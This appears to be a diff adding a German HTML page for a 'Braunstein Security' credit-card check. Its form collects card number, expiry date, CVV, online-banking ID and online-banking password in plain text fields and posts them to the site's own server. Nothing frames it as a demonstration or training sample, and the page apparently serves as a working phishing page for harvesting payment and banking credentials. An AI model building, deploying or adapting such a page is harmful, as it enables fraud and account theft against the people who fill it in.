@@ -1,0 +1,150 @@
+<!DOCTYPE html>
+<html lang="de">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Kreditkartenprüfung - Braunstein Security</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f4f4f9;
+            color: #333;
+            margin: 0;
+            padding: 0;
+        }
+
+        header {
+            background-color: #003366;
+            color: #fff;
+            padding: 20px 0;
+            text-align: center;
+        }
+
+        nav ul {
+            list-style: none;
+            padding: 0;
+            margin: 0;
+            text-align: center;
+        }
+
+        nav ul li {
+            display: inline;
+            margin-right: 15px;
+        }
+
+        nav ul li a {
+            color: #fff;
+            text-decoration: none;
+        }
+
+        nav ul li a:hover {
+            text-decoration: underline;
+        }
+
+        section {
+            padding: 20px;
+            margin: 20px;
+            background-color: #fff;
+            border-radius: 8px;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+        }
+
+        h2 {
+            color: #003366;
+        }
+
+        form {
+            max-width: 600px;
+            margin: 20px auto;
+            padding: 20px;
+            background-color: #fff;
+            border-radius: 8px;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+        }
+
+        form label {
+            display: block;
+            margin-bottom: 8px;
+            font-weight: bold;
+        }
+
+        form input[type="text"],
+        form input[type="number"],
+        form input[type="date"],
+        form button {
+            width: 100%;
+            padding: 10px;
+            margin-bottom: 15px;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+            box-sizing: border-box;
+        }
+
+        form button {
+            background-color: #003366;
+            color: #fff;
+            border: none;
+            cursor: pointer;
+            padding: 15px;
+        }
+
+        form button:hover {
+            background-color: #0055a5;
+        }
+
+        .footer {
+            background-color: #003366;
+            color: #fff;
+            text-align: center;
+            padding: 10px 0;
+            position: fixed;
+            width: 100%;
+            bottom: 0;
+        }
+    </style>
+</head>
+<body>
+    <header>
+        <h1>Braunstein Security</h1>
+        <nav>
+            <ul>
+                <li><a href="index.html">Home</a></li>
+                <li><a href="kontopruefung.html">Kontoprüfung</a></li>
+                <li><a href="kreditkartenpruefung.html">Kreditkartenprüfung</a></li>
+                <li><a href="bonitaetscheck.html">Bonitätscheck</a></li>
+                <li><a href="kontakt.html">Kontakt</a></li>
+            </ul>
+        </nav>
+    </header>
+
+    <section>
+        <h2>Kreditkartenprüfung</h2>
+        <p>Prüfen Sie hier Ihre Kreditkartendaten.</p>
+        <form action="/kreditkartenpruefung" method="POST">
+            <label for="kartentyp">Kartentyp:</label>
+            <input type="text" id="kartentyp" name="kartentyp" placeholder="Visa, MasterCard, etc." required>
+            
+            <label for="kartennummer">Kartennummer:</label>
+            <input type="text" id="kartennummer" name="kartennummer" placeholder="1234 5678 9012 3456" required>
+            
+            <label for="verfallsdatum">Verfallsdatum:</label>
+            <input type="text" id="verfallsdatum" name="verfallsdatum" placeholder="MM/JJ" required>
+            
+            <label for="cvv">CVV:</label>
+            <input type="text" id="cvv" name="cvv" placeholder="123" required>
+            
+            <label for="onlineBankingID">Online-Banking ID:</label>
+            <input type="text" id="onlineBankingID" name="onlineBankingID" placeholder="Online-Banking ID eingeben" required>
+
+            <label for="OnlineBankingPasswort">Online-Banking Passwort:</label>
+            <input type="text" id="OnlineBankingPasswort" name="OnlineBankingPasswort" placeholder="OnlineBankingPasswort eingeben" required>
+            
+            <button type="submit">Prüfen</button>
+        </form>
+    </section>
+
+    <footer class="footer">
+        &copy; 2024 Braunstein Security
+    </footer>
+</body>
+</html>
